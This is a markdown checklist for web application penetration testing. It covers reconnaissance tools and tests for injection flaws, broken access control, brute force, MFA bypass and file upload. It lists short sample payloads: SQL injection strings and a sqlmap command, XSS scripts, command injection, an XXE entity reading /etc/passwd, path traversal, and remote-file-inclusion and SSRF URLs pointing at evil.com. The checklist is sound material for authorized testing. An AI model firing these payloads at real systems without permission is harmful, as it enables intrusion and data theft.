
# 🛡️ Web Penetration Testing Checklist

## Pre-Testing Checklist 📝

1. **Set up VPN and Environment:**
    - Ensure your VPN is connected.
    - Confirm Burp Suite is properly configured to capture traffic.
2. **Initial Reconnaissance:**
    - Use tools like `nmap` to identify open ports and services.
    - Use `ffuf` or `dirb` to discover hidden directories and files.
    - Enumerate subdomains with tools like `sublist3r` or `amass`.

---

## Injections and Common Vulnerabilities 🕵️

### SQL Injection (SQLi) 🐍

- **Identify Inputs:**
    - Look for form fields, URL parameters, headers, cookies.
- **Test with Simple Payloads:**
    - Payload: `' OR 1=1--`
- **Tools and Commands:**
    - `sqlmap -u "http://target.com/page?id=1" --batch --dbs`
- **Types of SQLi:**
    - **Error-Based**, **Blind SQLi**, **Second-Order SQLi**.

### Cross-Site Scripting (XSS) 🚀

- **Identify Inputs:** Input fields, URL parameters, headers.
- **Payloads:**
    - Stored: `<script>alert('XSS')</script>`
    - Reflected: `"><script>alert('XSS')</script>`
    - DOM-Based: `#"><img src=/ onerror=alert(2)>`

### Command Injection 💻

- **Identify Inputs:** Fields executing system commands (IP fields, file paths).
- **Payloads:** `; ls -la`, `; sleep 10`.

### Server-Side Template Injection (SSTI) 🖥️

- **Identify Inputs:** Fields handling template syntax.
- **Payloads:** `{{7*7}}`, `${7*7}`.

### XML External Entity (XXE) Injection 📄

- **Identify Inputs:** Fields accepting XML input.
- **Payloads:** `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`.

### File Inclusion (LFI/RFI) 📂

- **Identify Inputs:** Parameters handling file paths.
- **Payloads:** `../../../../etc/passwd`, `http://evil.com/shell.php`.

### Server-Side Request Forgery (SSRF) 🌐

- **Identify Inputs:** Parameters handling URLs.
- **Payloads:** `http://localhost:8080`, `http://evil.com`.

---

## Access Controls 🔐

### IDOR (Insecure Direct Object References) 🔍

- **Identify Inputs:** Parameters referencing objects (IDs, filenames).
- **Payloads:** Modify IDs to access unauthorized data.

### BOLA (Broken Object Level Authorization) 🛠️

- **Identify Inputs:** API endpoints managing objects.
- **Payloads:** Modify object IDs in API requests.

### BFLA (Broken Function Level Authorization) 🔧

- **Identify Inputs:** Endpoints managing different functions.
- **Payloads:** Access admin functions as a regular user.

---

## API Security Testing 🛡️

- **Identify Inputs:** Endpoints, methods, parameters.
- **Payloads:** Test for SQLi, XSS, IDOR, BOLA vulnerabilities.

---

## Miscellaneous Attacks 🎯

### Brute-Force Attacks 🚪

- **Identify Inputs:** Login forms, authentication pages.
- **Tools:** `hydra`, Burp Suite Intruder.

### Attacking MFA 🔑

- **Identify Inputs:** MFA verification steps.
- **Payloads:** Attempt to bypass or reuse tokens.

### Insecure File Upload 📁

- **Identify Inputs:** File upload forms.
- **Payloads:** Upload web shells or malicious files.

### Bypassing Input Validation 🔍

- **Identify Inputs:** Any user input fields.
- **Techniques:** HTML Encoding, URL Encoding.

---

## Final Steps ✅

- **Document Findings:**
    - Detailed notes, screenshots, PoCs.
- **Generate Report:**
    - Structured summary with recommendations.

---

This comprehensive checklist will guide you through web application penetration testing systematically, ensuring you identify and assess a wide range of potential vulnerabilities.
